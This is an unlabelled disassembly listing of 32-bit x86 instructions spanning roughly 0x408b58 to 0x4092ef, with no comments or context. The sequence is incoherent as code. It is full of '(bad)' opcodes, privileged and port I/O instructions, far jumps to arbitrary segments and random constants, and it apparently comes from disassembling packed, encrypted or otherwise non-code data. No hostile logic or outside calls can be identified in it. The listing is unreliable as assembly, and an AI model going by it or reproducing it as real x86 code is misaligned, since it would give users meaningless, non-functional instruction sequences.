  408b58:	sub    BYTE PTR [edi+0x7f],0xa1
  408b5c:	mov    ah,ah
  408b5e:	sub    al,0x3c
  408b60:	popa   
  408b61:	cmc    
  408b62:	jo     0x408b8f
  408b64:	sub    al,0xf1
  408b66:	jp     0x408bc9
  408b68:	dec    ebp
  408b69:	push   0xd1ded6aa
  408b6e:	sbb    DWORD PTR [esi+0x32d8f568],ebx
  408b74:	(bad)  
  408b75:	daa    
  408b76:	mov    ds:0xc18d1b18,al
  408b7b:	inc    ebp
  408b7c:	add    BYTE PTR [ecx],al
  408b7e:	pop    ecx
  408b7f:	add    esi,edi
  408b81:	sbb    al,BYTE PTR [esi]
  408b83:	sub    DWORD PTR [ebx+0x2],esp
  408b86:	and    DWORD PTR [esi],0xffffffd9
  408b89:	pop    es
  408b8a:	jg     0x408b8d
  408b8c:	add    edx,esi
  408b8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b8f:	stos   BYTE PTR es:[edi],al
  408b90:	bound  ecx,QWORD PTR [esi+0x17]
  408b93:	sub    al,0x3a
  408b95:	push   ebx
  408b96:	xchg   ebp,eax
  408b97:	arpl   WORD PTR [eax*8+0x26ebf249],ax
  408b9e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  408ba0:	mov    edi,0x188c1cf6
  408ba5:	pop    esi
  408ba6:	mov    ds:0x8d9aef3a,eax
  408bab:	or     BYTE PTR [ebp+0x7a],dh
  408bae:	and    BYTE PTR [edi-0x614fd502],0xa1
  408bb5:	ins    BYTE PTR es:[edi],dx
  408bb6:	xor    BYTE PTR [eax],dl
  408bb8:	aam    0x46
  408bba:	into   
  408bbb:	int    0x23
  408bbd:	mov    edx,0x84282c44
  408bc2:	outs   dx,BYTE PTR ds:[esi]
  408bc3:	(bad)  
  408bc4:	sbb    esi,ecx
  408bc6:	popa   
  408bc7:	xchg   edx,eax
  408bc8:	outs   dx,DWORD PTR ds:[esi]
  408bc9:	rol    BYTE PTR [ecx+edi*8],0xdf
  408bcd:	jbe    0x408baf
  408bcf:	xchg   ebx,eax
  408bd0:	(bad)  
  408bd1:	mov    ah,0x25
  408bd3:	nop
  408bd4:	xor    al,0x9c
  408bd6:	(bad)  [esi+0x3d3db7c8]
  408bdc:	clc    
  408bdd:	inc    edx
  408bde:	stos   BYTE PTR es:[edi],al
  408bdf:	lahf   
  408be0:	cwde   
  408be1:	(bad)  [ebp+0x72]
  408be4:	xor    dh,al
  408be6:	xchg   ebp,eax
  408be7:	sub    eax,0xfa37df56
  408bec:	sub    eax,0xb2eb2955
  408bf1:	loope  0x408b77
  408bf3:	xchg   esi,eax
  408bf4:	mov    al,0xf0
  408bf6:	cmp    al,0xb6
  408bf8:	and    DWORD PTR [ecx+ecx*2-0x57810cad],edi
  408bff:	xchg   ebp,eax
  408c00:	sbb    edx,eax
  408c02:	sub    al,0x90
  408c04:	fisubr DWORD PTR [ecx+edi*8]
  408c07:	nop
  408c08:	data16 loopne 0x408c2d
  408c0b:	int3   
  408c0c:	ret    
  408c0d:	mov    ebx,0x153c6d75
  408c12:	fwait
  408c13:	inc    ecx
  408c14:	call   0xaba2:0x5cea68fb
  408c1b:	in     eax,0x2f
  408c1d:	popa   
  408c1e:	jmp    0x8b017495
  408c23:	repz ffreep st(2)
  408c26:	dec    ebx
  408c27:	pushf  
  408c28:	out    dx,al
  408c29:	not    DWORD PTR [ebx-0x3b]
  408c2c:	push   ebx
  408c2d:	dec    edx
  408c2e:	xchg   esi,eax
  408c2f:	call   0xd6642236
  408c34:	push   ebx
  408c35:	ficom  WORD PTR [ebx+ecx*8-0x39adafb9]
  408c3c:	mov    ch,0xf
  408c3e:	xlat   BYTE PTR ds:[ebx]
  408c3f:	lahf   
  408c40:	xchg   esp,eax
  408c41:	push   edx
  408c42:	push   edi
  408c43:	test   eax,0x797d4172
  408c48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c49:	sbb    esp,esp
  408c4b:	nop
  408c4c:	and    edi,DWORD PTR [edx-0x4e]
  408c4f:	mov    cl,BYTE PTR [eax]
  408c51:	jae    0x408c0f
  408c53:	dec    eax
  408c54:	dec    edi
  408c55:	stos   DWORD PTR es:[edi],eax
  408c56:	sbb    bl,ch
  408c58:	jno    0x408c18
  408c5a:	sbb    DWORD PTR [edi+0x1b],esi
  408c5d:	xchg   edx,eax
  408c5e:	mov    eax,ds:0x8a5cb458
  408c63:	sub    BYTE PTR [eax+0x7b20a548],0x47
  408c6a:	gs cdq 
  408c6c:	pop    esi
  408c6d:	loopne 0x408bfc
  408c6f:	sub    eax,0xea05a5f6
  408c74:	fisub  WORD PTR [eax-0x431b3a9d]
  408c7a:	dec    esi
  408c7b:	fdiv   QWORD PTR [esi]
  408c7d:	or     ecx,DWORD PTR [edx+esi*2-0x37c76585]
  408c84:	sub    BYTE PTR [ecx+0x3e],dh
  408c87:	sub    eax,0xa1598e10
  408c8c:	pop    ds
  408c8d:	scas   eax,DWORD PTR es:[edi]
  408c8e:	iret   
  408c8f:	jo     0x408cd1
  408c91:	fsubr  DWORD PTR [ebp-0x2d51ff0f]
  408c97:	mov    ch,0x73
  408c99:	jns    0x408c6b
  408c9b:	add    al,BYTE PTR [edi-0x2a98331a]
  408ca1:	iret   
  408ca2:	or     eax,0x3905fbde
  408ca7:	out    0xc9,eax
  408ca9:	push   ds
  408caa:	jnp    0x408cfc
  408cac:	mov    WORD PTR [edx],es
  408cae:	add    eax,DWORD PTR [edx-0x44]
  408cb1:	sub    al,0x15
  408cb3:	sbb    bl,BYTE PTR [ecx+0x2a]
  408cb6:	pusha  
  408cb7:	mov    al,ds:0xe15c5093
  408cbc:	add    BYTE PTR [ecx],0x83
  408cbf:	pop    ecx
  408cc0:	ficom  DWORD PTR [edx-0x63]
  408cc3:	fisttp QWORD PTR [ecx]
  408cc5:	push   0xb
  408cc7:	or     eax,0xe8385aa7
  408ccc:	(bad)  
  408ccd:	jno    0x408cb9
  408ccf:	xchg   ebx,eax
  408cd0:	shr    BYTE PTR [ebp-0x163169d6],cl
  408cd6:	js     0x408ce6
  408cd8:	retf   0xb98b
  408cdb:	stos   BYTE PTR es:[edi],al
  408cdc:	icebp  
  408cdd:	nop
  408cde:	sbb    ebp,ebp
  408ce0:	loopne 0x408d2f
  408ce2:	icebp  
  408ce3:	dec    edi
  408ce4:	xchg   esp,eax
  408ce5:	pushf  
  408ce6:	sbb    al,0xbe
  408ce8:	and    cl,0x9c
  408ceb:	jecxz  0x408ce4
  408ced:	retf   0x29d
  408cf0:	iret   
  408cf1:	(bad)  
  408cf2:	pop    ebx
  408cf3:	mov    edi,0xe53c385a
  408cf8:	imul   esp,DWORD PTR [eax+0x43],0x2467236f
  408cff:	das    
  408d00:	mov    eax,0x53fe2516
  408d05:	cmp    al,0x2d
  408d07:	hlt    
  408d08:	jecxz  0x408d46
  408d0a:	xchg   esp,eax
  408d0b:	add    ebp,esi
  408d0d:	mov    eax,0x5756a6a9
  408d12:	pop    ebx
  408d13:	mov    ch,0x1a
  408d15:	mov    gs:0x5ef45ff9,eax
  408d1b:	mov    esp,0x27bd47ac
  408d20:	es in  eax,0x9b
  408d23:	add    ah,ch
  408d25:	xor    dh,BYTE PTR [ecx-0x1]
  408d28:	pop    ebp
  408d29:	loopne 0x408d3c
  408d2b:	add    ebp,DWORD PTR [ecx*2+0x2301a6f0]
  408d32:	mov    eax,ds:0xd27b60a7
  408d37:	cld    
  408d38:	pause  
  408d3a:	jae    0x408d0d
  408d3c:	cld    
  408d3d:	jge    0x408d8b
  408d3f:	mov    ebp,DWORD PTR [ebx-0x2]
  408d42:	les    esp,FWORD PTR [ebp-0x6f2948c8]
  408d48:	adc    al,0x18
  408d4a:	sub    DWORD PTR [edi-0x26],0x8b5ec426
  408d51:	jo     0x408d55
  408d53:	leave  
  408d54:	jle    0x408d64
  408d56:	imul   ebp,DWORD PTR [eax+0x3c],0xffffffd8
  408d5a:	mov    edi,ss
  408d5c:	dec    edx
  408d5d:	xchg   esi,eax
  408d5e:	loop   0x408d23
  408d60:	repz mov cl,0x78
  408d63:	stc    
  408d64:	nop
  408d65:	push   eax
  408d66:	lods   al,BYTE PTR ds:[esi]
  408d67:	daa    
  408d68:	outs   dx,DWORD PTR ds:[esi]
  408d69:	dec    eax
  408d6a:	aam    0xb
  408d6c:	add    BYTE PTR [edx+0x71],bl
  408d6f:	pop    ebx
  408d70:	sbb    ecx,DWORD PTR [edx+0x72]
  408d73:	fdivr  QWORD PTR [ebx-0x602c0d1e]
  408d79:	jmp    0xef59:0x814d40e4
  408d80:	int3   
  408d81:	dec    edi
  408d82:	shl    DWORD PTR [ebp-0x1a],0xc
  408d86:	sbb    al,0x8c
  408d88:	sub    al,0xbd
  408d8a:	push   esi
  408d8b:	hlt    
  408d8c:	lds    esp,FWORD PTR [edi-0x488dcb09]
  408d92:	jp     0x408d5b
  408d94:	sar    BYTE PTR [ecx-0x203733da],0xb9
  408d9b:	cdq    
  408d9c:	push   esp
  408d9d:	add    DWORD PTR [eax-0x731ca4e6],0x48
  408da4:	cmp    DWORD PTR [edx],esi
  408da6:	fstp   QWORD PTR [edi+0x6c]
  408da9:	jle    0x408d6c
  408dab:	mov    BYTE PTR [ecx],ah
  408dad:	sub    eax,0x6333695b
  408db2:	js     0x408d43
  408db4:	addr16 dec eax
  408db6:	out    dx,eax
  408db7:	sbb    edi,0x66
  408dba:	aaa    
  408dbb:	pop    ebp
  408dbc:	pop    esi
  408dbd:	cmp    DWORD PTR [esi+edi*2+0x5d],ecx
  408dc1:	mov    al,0xf2
  408dc3:	inc    ebx
  408dc4:	push   edi
  408dc5:	loop   0x408dc8
  408dc7:	in     eax,dx
  408dc8:	loope  0x408e49
  408dca:	bound  ecx,QWORD PTR [esi-0x45]
  408dcd:	mov    dl,0xe5
  408dcf:	sub    ch,dh
  408dd1:	retf   0x1d9d
  408dd4:	pop    esi
  408dd5:	dec    eax
  408dd6:	pop    ds
  408dd7:	xor    al,0x2c
  408dd9:	loop   0x408e4b
  408ddb:	adc    DWORD PTR [eax-0x68],edx
  408dde:	cli    
  408ddf:	inc    ebx
  408de0:	stc    
  408de1:	inc    eax
  408de2:	popf   
  408de3:	test   al,0x29
  408de5:	fsubr  DWORD PTR [edi]
  408de7:	rcr    DWORD PTR ds:0x306f2f39,0x2
  408dee:	popf   
  408def:	div    DWORD PTR [edi-0x48041ce5]
  408df5:	hlt    
  408df6:	jno    0x408de4
  408df8:	inc    edx
  408df9:	add    BYTE PTR [eax+0x58],ah
  408dfc:	pop    eax
  408dfd:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dff:	push   ebp
  408e00:	clc    
  408e01:	xchg   ecx,eax
  408e02:	xor    DWORD PTR [eax],esp
  408e04:	ins    DWORD PTR es:[edi],dx
  408e05:	inc    esp
  408e06:	fwait
  408e07:	enter  0x6319,0xec
  408e0b:	mov    al,ds:0xb8094d56
  408e10:	pop    ds
  408e11:	dec    ecx
  408e12:	ja     0x408db3
  408e14:	or     ebp,ecx
  408e16:	test   ecx,ecx
  408e18:	add    DWORD PTR [ebx+0x6c49192f],ecx
  408e1e:	int3   
  408e1f:	pop    es
  408e20:	(bad)  
  408e21:	out    dx,eax
  408e22:	ss test al,dl
  408e25:	rol    BYTE PTR [edi-0x77],1
  408e28:	cmp    ebp,esi
  408e2a:	fadd   QWORD PTR [ebp-0x2d895d7d]
  408e30:	mov    ebp,0x84636ef2
  408e35:	push   edx
  408e36:	leave  
  408e37:	gs pushf 
  408e39:	add    eax,0x9176a739
  408e3e:	cli    
  408e3f:	das    
  408e40:	pusha  
  408e41:	add    eax,0x5eaf64cb
  408e46:	push   ebx
  408e47:	sub    eax,0xf1e594de
  408e4c:	ror    BYTE PTR [edx-0x283c8b86],cl
  408e52:	mov    al,ds:0xd4d02291
  408e57:	push   0xdf630815
  408e5c:	pop    es
  408e5d:	jne    0x408e7b
  408e5f:	cmp    edi,DWORD PTR [ebx]
  408e61:	mov    ch,dl
  408e63:	jl     0x408eb4
  408e65:	adc    bl,BYTE PTR [ebx-0x11]
  408e68:	adc    BYTE PTR [edx],ah
  408e6a:	sub    BYTE PTR [ecx+eiz*8+0x5a75fcf2],dl
  408e71:	stos   DWORD PTR es:[edi],eax
  408e72:	mov    al,0xbe
  408e74:	jmp    0xaea7:0x74f19d18
  408e7b:	sbb    bh,BYTE PTR [eax+edx*1-0x58]
  408e7f:	pop    ebp
  408e80:	imul   DWORD PTR [ebx+0x2ccfd775]
  408e86:	or     al,0xe8
  408e88:	push   esp
  408e89:	cld    
  408e8a:	xchg   edx,eax
  408e8b:	sbb    bh,ah
  408e8d:	ret    0x3eff
  408e90:	gs pop ds
  408e92:	dec    esp
  408e93:	rol    DWORD PTR [edx],0x7a
  408e96:	mov    dl,dh
  408e98:	or     eax,0x68363458
  408e9d:	jl     0x408e7e
  408e9f:	or     BYTE PTR [ebp-0x13],ah
  408ea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ea3:	inc    eax
  408ea4:	(bad)  
  408ea5:	dec    ebx
  408ea6:	and    al,0xee
  408ea8:	(bad)  
  408ea9:	ja     0x408ee9
  408eab:	jbe    0x408edf
  408ead:	pop    edi
  408eae:	mov    eax,esi
  408eb0:	rol    BYTE PTR [eax],cl
  408eb2:	sub    DWORD PTR ds:0xd1e12d32,ecx
  408eb8:	or     eax,0x549125bd
  408ebd:	stos   DWORD PTR es:[edi],eax
  408ebe:	push   ebp
  408ebf:	cmp    dl,BYTE PTR [ebx+esi*2]
  408ec2:	mov    dh,0x76
  408ec4:	push   edi
  408ec5:	pop    esp
  408ec6:	cmp    al,0x25
  408ec8:	(bad)  
  408ec9:	push   cs
  408eca:	mov    bh,0x11
  408ecc:	sbb    ecx,DWORD PTR [edi+eiz*4+0x2a]
  408ed0:	(bad)  
  408ed1:	mov    ds:0x6ed789c4,eax
  408ed6:	aam    0xfb
  408ed8:	xchg   edx,eax
  408ed9:	fcmove st,st(6)
  408edb:	mov    cl,0x66
  408edd:	mov    eax,0x765030e1
  408ee2:	push   ecx
  408ee3:	shr    ebx,0xa9
  408ee6:	sbb    al,dh
  408ee8:	xchg   BYTE PTR [esi-0x4384de21],dh
  408eee:	cmp    bl,BYTE PTR ds:0x855dcd65
  408ef4:	addr16 clc 
  408ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ef7:	or     DWORD PTR [esp+ebp*2],0x30a736e
  408efe:	mov    al,0xd0
  408f00:	pop    edx
  408f01:	repz push eax
  408f03:	pop    eax
  408f04:	push   ss
  408f05:	mov    ebp,0x65c7b7a1
  408f0a:	add    BYTE PTR gs:[esi+0x6b],ah
  408f0e:	daa    
  408f0f:	jo     0x408f53
  408f11:	(bad)  
  408f12:	mov    al,ds:0x13c0a4d1
  408f17:	pop    esi
  408f18:	sbb    BYTE PTR [ecx+edx*1],dl
  408f1b:	invd   
  408f1d:	sbb    bh,BYTE PTR [ecx+0x1a9b36c6]
  408f23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f24:	outs   dx,DWORD PTR ds:[esi]
  408f25:	sbb    al,0x17
  408f27:	inc    edx
  408f28:	ins    DWORD PTR es:[edi],dx
  408f29:	sbb    BYTE PTR [eax+eiz*4],ch
  408f2c:	cmp    BYTE PTR [ecx-0x1e2ae7b9],dh
  408f32:	xor    edi,DWORD PTR [ebx-0x45]
  408f35:	and    al,0xe7
  408f37:	pop    ebx
  408f38:	daa    
  408f39:	sub    eax,0x85f2e722
  408f3e:	cmp    BYTE PTR [ecx-0x7e],0xae
  408f42:	and    bh,BYTE PTR [esi+0x38]
  408f45:	pop    ss
  408f46:	mov    edx,0x399a8675
  408f4b:	cmp    DWORD PTR [esp+ebp*1],esp
  408f4e:	jb     0x408f76
  408f50:	std    
  408f51:	inc    edx
  408f52:	jnp    0x408ee0
  408f54:	sbb    DWORD PTR [eax+0x510a124f],ecx
  408f5a:	xor    ebx,edi
  408f5c:	pop    ebx
  408f5d:	shl    bl,cl
  408f5f:	and    DWORD PTR [ecx+0x28],0x1d
  408f63:	push   0xcb088ecb
  408f68:	push   ebx
  408f69:	test   eax,0xef079cf8
  408f6e:	shl    DWORD PTR [esi-0x1f],cl
  408f71:	push   es
  408f72:	cmc    
  408f73:	ret    
  408f74:	(bad)  
  408f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f76:	mov    cl,0xe1
  408f78:	test   BYTE PTR [edi-0x60],ah
  408f7b:	outs   dx,BYTE PTR ds:[esi]
  408f7c:	(bad)  
  408f7d:	lock popa 
  408f7f:	push   eax
  408f80:	and    eax,edi
  408f82:	push   edi
  408f83:	jne    0x408f07
  408f85:	cmp    DWORD PTR [ebx-0x69277740],0xd4bcd55b
  408f8f:	(bad)  
  408f90:	in     eax,dx
  408f91:	(bad)  
  408f94:	mov    cl,BYTE PTR [eax+ecx*8]
  408f97:	or     al,0xee
  408f99:	fldz   
  408f9b:	xchg   ebp,eax
  408f9c:	ret    0xebe3
  408f9f:	xor    DWORD PTR [eax+0x1898da94],0x6ea1cbd8
  408fa9:	repz adc DWORD PTR [eax-0x5e],esi
  408fad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fae:	fistp  WORD PTR [esi+0x1d]
  408fb1:	outs   dx,DWORD PTR ds:[esi]
  408fb2:	lock ins DWORD PTR es:[edi],dx
  408fb4:	std    
  408fb5:	lahf   
  408fb6:	gs add ecx,eax
  408fb9:	jecxz  0x408fba
  408fbb:	mov    cl,0x95
  408fbd:	retf   
  408fbe:	das    
  408fbf:	fadd   st(7),st
  408fc1:	dec    eax
  408fc2:	jecxz  0x40901f
  408fc4:	mov    edi,0xc20cd164
  408fc9:	into   
  408fca:	xchg   DWORD PTR es:[esi],eax
  408fcd:	xchg   ebx,eax
  408fce:	pop    ebp
  408fcf:	dec    ecx
  408fd0:	call   0x9ac3ec98
  408fd5:	hlt    
  408fd6:	jmp    0x40d088c8
  408fdb:	jno    0x408f68
  408fdd:	ret    
  408fde:	inc    esi
  408fdf:	in     al,dx
  408fe0:	fldenv [ebx]
  408fe2:	mov    bh,BYTE PTR [edx+ecx*2-0x17bd8729]
  408fe9:	dec    edx
  408fea:	mov    ds,WORD PTR [edi]
  408fec:	pop    ebp
  408fed:	add    bl,BYTE PTR fs:[ebp+edi*8+0x1aea86f8]
  408ff5:	cdq    
  408ff6:	jp     0x409052
  408ff8:	push   0xffffff86
  408ffa:	push   edi
  408ffb:	dec    ebx
  408ffc:	cld    
  408ffd:	das    
  408ffe:	dec    ebp
  408fff:	dec    ecx
  409000:	inc    edi
  409001:	and    ch,BYTE PTR [ecx+0x4fb1eb8f]
  409007:	pushf  
  409008:	(bad)  
  409009:	vpsubb xmm0,xmm3,xmm6
  40900d:	push   DWORD PTR [esi-0x77cbaba8]
  409013:	les    edx,FWORD PTR [eax-0x60]
  409016:	inc    ebp
  409017:	clc    
  409018:	xchg   esi,eax
  409019:	push   ds
  40901a:	pop    es
  40901b:	in     al,dx
  40901c:	xchg   esi,eax
  40901d:	xlat   BYTE PTR ds:[ebx]
  40901e:	and    al,ch
  409020:	fiadd  WORD PTR [ecx+0x3c27f104]
  409026:	cmp    eax,0xfb930672
  40902b:	push   ss
  40902c:	xchg   ecx,eax
  40902d:	mov    dl,0x87
  40902f:	out    dx,al
  409030:	popa   
  409031:	inc    ebx
  409032:	arpl   WORD PTR [esi+edi*1+0x571081ad],bx
  409039:	cmp    edi,DWORD PTR [eax+0x34]
  40903c:	jno    0x40905c
  40903e:	add    al,0x2c
  409040:	mov    ebx,0xec1b8719
  409045:	and    esi,DWORD PTR [ebx-0x2778e269]
  40904b:	nop
  40904c:	ins    DWORD PTR es:[edi],dx
  40904d:	sub    BYTE PTR [ebp+0x6f6961a7],ah
  409053:	xchg   edx,eax
  409054:	jl     0x4090a1
  409056:	mov    bh,0x79
  409058:	int3   
  409059:	jae    0x409076
  40905b:	inc    esi
  40905c:	ds jne 0x40903b
  40905f:	hlt    
  409060:	push   cs
  409061:	sub    al,0xe1
  409063:	fwait
  409064:	scas   al,BYTE PTR es:[edi]
  409065:	outs   dx,DWORD PTR ds:[esi]
  409066:	or     DWORD PTR [esi+0x1b],esi
  409069:	(bad)  
  40906a:	mov    al,ds:0x93506123
  40906f:	popa   
  409070:	pop    eax
  409071:	sub    DWORD PTR cs:[edx+ecx*2+0x6879b10a],0x36
  40907a:	adc    BYTE PTR [edi],dh
  40907c:	xchg   ebp,eax
  40907d:	or     BYTE PTR [esi-0x8],dl
  409080:	mov    bh,0x32
  409082:	iret   
  409083:	int    0xd3
  409085:	ficomp DWORD PTR [eax]
  409087:	addr16 cwde 
  409089:	jno    0x4090f7
  40908b:	out    0x1a,eax
  40908d:	mov    eax,0x6c4d8558
  409092:	jnp    0x4090d7
  409094:	out    dx,al
  409095:	adc    DWORD PTR ds:0x8c2c41df,0x809d56a7
  40909f:	adc    BYTE PTR [eax+ecx*4+0x12a71f83],al
  4090a6:	add    cl,al
  4090a8:	mov    WORD PTR [esi-0x5ab0b3cc],cs
  4090ae:	pop    edx
  4090af:	jl     0x40903b
  4090b1:	or     al,0x91
  4090b3:	jmp    0x63dd:0x7b0224cf
  4090ba:	iret   
  4090bb:	sbb    eax,0x7b70a92e
  4090c0:	outs   dx,BYTE PTR ds:[esi]
  4090c1:	push   ss
  4090c2:	jnp    0x40907d
  4090c4:	sar    DWORD PTR ds:0x31219edb,cl
  4090ca:	mov    al,ds:0x8f505f91
  4090cf:	dec    edi
  4090d0:	scas   eax,DWORD PTR es:[edi]
  4090d1:	ret    
  4090d2:	pop    ebx
  4090d3:	retf   0x592
  4090d6:	and    dl,dl
  4090d8:	out    0x85,eax
  4090da:	(bad)  
  4090db:	idiv   DWORD PTR [esi]
  4090dd:	cmp    ecx,eax
  4090df:	(bad)  
  4090e1:	mov    ah,0x1f
  4090e3:	push   cs
  4090e4:	push   ds
  4090e5:	ficom  DWORD PTR [ebp+0x74f4e48c]
  4090eb:	mov    ebp,0x72d24ff6
  4090f0:	fldenv [ecx+0x6f88fb53]
  4090f6:	std    
  4090f7:	bound  edx,QWORD PTR [ecx+0x4]
  4090fa:	lods   eax,DWORD PTR ds:[esi]
  4090fb:	add    al,0x4d
  4090fd:	test   BYTE PTR [edi-0x5d],ah
  409100:	push   esp
  409101:	and    ch,BYTE PTR [edx-0x5c]
  409104:	mov    bl,0x6c
  409106:	mov    cl,0x34
  409108:	lahf   
  409109:	scas   al,BYTE PTR es:[edi]
  40910a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40910b:	sub    eax,0xecd4c40f
  409110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409111:	and    DWORD PTR [edi+0x29b08070],esp
  409117:	jbe    0x409115
  409119:	sbb    dl,al
  40911b:	mov    cl,0xf5
  40911d:	mov    dh,0xd5
  40911f:	cmp    DWORD PTR [ecx+0x73],ebx
  409122:	jp     0x4090f4
  409124:	rcl    BYTE PTR [edi+0x726b1c20],1
  40912a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40912b:	das    
  40912c:	mov    al,0xcd
  40912e:	paddq  mm5,mm7
  409131:	pop    ecx
  409132:	fld    QWORD PTR [esi-0x29]
  409135:	ficomp DWORD PTR [edx-0x70]
  409138:	dec    ebx
  409139:	ret    0xf552
  40913c:	mov    ch,BYTE PTR [ebx+0x50970a27]
  409142:	lds    ebp,FWORD PTR [ebx-0x6e]
  409145:	or     al,0x21
  409147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409148:	popa   
  409149:	pop    esi
  40914a:	and    ebp,DWORD PTR [esi+0x6d85081c]
  409150:	adc    al,0x99
  409152:	mov    dl,0xc
  409154:	iret   
  409155:	xlat   BYTE PTR ds:[ebx]
  409156:	and    eax,0x74d6cf21
  40915b:	dec    eax
  40915c:	mov    ebp,0xb78f8c9
  409161:	sub    eax,eax
  409163:	(bad)  
  409164:	cli    
  409165:	nop
  409166:	push   ebx
  409167:	fisttp WORD PTR [edi+0x79]
  40916a:	les    esp,FWORD PTR [ecx+esi*4]
  40916d:	loop   0x4091b3
  40916f:	sub    DWORD PTR [edx],ebp
  409171:	jo     0x40918c
  409173:	js     0x409151
  409175:	xor    BYTE PTR [eax-0x14f6a369],0x7b
  40917c:	enter  0x1aba,0x4d
  409180:	scas   eax,DWORD PTR es:[edi]
  409181:	mov    bh,BYTE PTR [ecx-0x62]
  409184:	or     eax,0x4610445f
  409189:	jmp    0x1011:0xd1508dcd
  409190:	imul   edx,DWORD PTR [ebp+0xfd9e8a9],0x4c0de164
  40919a:	pop    esi
  40919b:	dec    ebp
  40919c:	imul   edx,edx,0x46
  40919f:	mov    cl,0xcf
  4091a1:	sti    
  4091a2:	rcl    DWORD PTR [edi+0x468e05a4],0x4f
  4091a9:	mov    dh,0x83
  4091ab:	and    BYTE PTR [ecx-0x2f],0x81
  4091af:	pop    ss
  4091b0:	mov    ds:0xfe716c92,al
  4091b5:	sbb    bl,BYTE PTR [esi]
  4091b7:	push   0xffffffdb
  4091b9:	sbb    ch,BYTE PTR [ecx+0x53]
  4091bc:	adc    DWORD PTR [eax+ecx*8+0x79],0x5a
  4091c1:	xchg   dh,dh
  4091c3:	adc    BYTE PTR [eax-0x76],ah
  4091c6:	adc    DWORD PTR [ecx-0x25],0xffffffe2
  4091ca:	pop    ebx
  4091cb:	imul   eax,DWORD PTR [ebp-0x1d454a76],0xaccf1706
  4091d5:	inc    BYTE PTR [ecx+0x34]
  4091d8:	add    eax,0x125bd109
  4091dd:	das    
  4091de:	jno    0x409215
  4091e0:	jne    0x409169
  4091e2:	xor    edi,DWORD PTR [edx+0x30ed9568]
  4091e8:	adc    DWORD PTR [esi-0x2e],esp
  4091eb:	adc    DWORD PTR [esi],ecx
  4091ed:	jmp    DWORD PTR [ecx+0x26]
  4091f0:	ds (bad) 
  4091f2:	jmp    0x409242
  4091f4:	push   ecx
  4091f5:	jae    0x409254
  4091f7:	imul   ebp,DWORD PTR [ebx-0x1e0cb5ee],0x5e
  4091fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091ff:	popf   
  409200:	aad    0xec
  409202:	lods   al,BYTE PTR ds:[esi]
  409203:	lods   eax,DWORD PTR ds:[esi]
  409204:	sub    BYTE PTR [edx+0x6d],ah
  409207:	and    eax,0x2b809022
  40920c:	(bad)
  409210:	nop
  409211:	pop    esi
  409212:	outs   dx,DWORD PTR ds:[esi]
  409213:	jno    0x409293
  409215:	jg     0x4091ff
  409217:	cmp    al,0x45
  409219:	outs   dx,DWORD PTR ds:[esi]
  40921a:	aam    0x63
  40921c:	push   es
  40921d:	aam    0x52
  40921f:	adc    ch,0x24
  409222:	je     0x409250
  409224:	cmp    eax,0xb77a1048
  409229:	jecxz  0x40923e
  40922b:	adc    edx,DWORD PTR [ebp-0x3f]
  40922e:	xchg   ebp,eax
  40922f:	outs   dx,BYTE PTR ds:[esi]
  409230:	push   ss
  409231:	jnp    0x40926b
  409233:	push   0xffffffb3
  409235:	fs mov eax,0x5591ea6f
  40923b:	mov    ds:0xd6acadb8,eax
  409240:	std    
  409241:	arpl   di,ax
  409243:	push   ss
  409244:	stos   DWORD PTR es:[di],eax
  409246:	xchg   DWORD PTR [edx-0x4047c03c],ecx
  40924c:	xchg   esp,eax
  40924d:	cmp    ebp,DWORD PTR [eax+eiz*1+0x30]
  409251:	jo     0x4091e4
  409253:	mov    edi,0xf94619ae
  409258:	ds fs adc eax,0x330e485a
  40925f:	push   0xd4bbe37a
  409264:	std    
  409265:	jo     0x409232
  409267:	sar    esp,0xe3
  40926a:	jae    0x4092c4
  40926c:	xor    al,0x64
  40926e:	xchg   esi,eax
  40926f:	arpl   WORD PTR [ebx+eiz*2-0x51],bp
  409273:	popa   
  409274:	add    bl,ch
  409276:	fst    QWORD PTR [ebp-0x66]
  409279:	dec    eax
  40927a:	dec    eax
  40927b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40927c:	or     al,BYTE PTR ds:0xb244646b
  409282:	xor    al,0x8a
  409284:	jmp    0xee8961bb
  409289:	sbb    bh,bh
  40928b:	jp     0x409262
  40928d:	add    al,0x9a
  40928f:	xor    eax,DWORD PTR [edx-0x491ebacf]
  409295:	out    0xca,eax
  409297:	in     al,0x8d
  409299:	add    eax,0xb95d654f
  40929e:	push   ecx
  40929f:	add    al,0xb5
  4092a1:	mov    ebp,DWORD PTR [esi+0x1ea6bf6c]
  4092a7:	xchg   esi,eax
  4092a8:	and    BYTE PTR [ebx+0x5cacd5e6],ah
  4092ae:	repz mov dl,0x2
  4092b1:	inc    ecx
  4092b2:	xlat   BYTE PTR ds:[ebx]
  4092b3:	aaa    
  4092b4:	inc    ebx
  4092b5:	test   BYTE PTR [ebx-0x2b0ca046],dl
  4092bb:	dec    eax
  4092bc:	adc    edx,eax
  4092be:	dec    edx
  4092bf:	icebp  
  4092c0:	test   ah,ah
  4092c2:	sub    BYTE PTR [ebp+0x32c69d5e],0x6e
  4092c9:	in     al,0xc9
  4092cb:	cld    
  4092cc:	scas   eax,DWORD PTR es:[edi]
  4092cd:	loope  0x4092c5
  4092cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092d0:	xchg   ebp,eax
  4092d1:	cmp    DWORD PTR [esi-0x2df3aac5],esi
  4092d7:	lock fs cmp eax,0x328e52d1
  4092de:	pushf  
  4092df:	setle  BYTE PTR [esi+0x29e230bf]
  4092e6:	not    BYTE PTR [eax]
  4092e8:	dec    edx
  4092e9:	mov    dl,BYTE PTR [edi+0x7ef73bde]
  4092ef:	stos   DWORD PTR es:[edi],eax
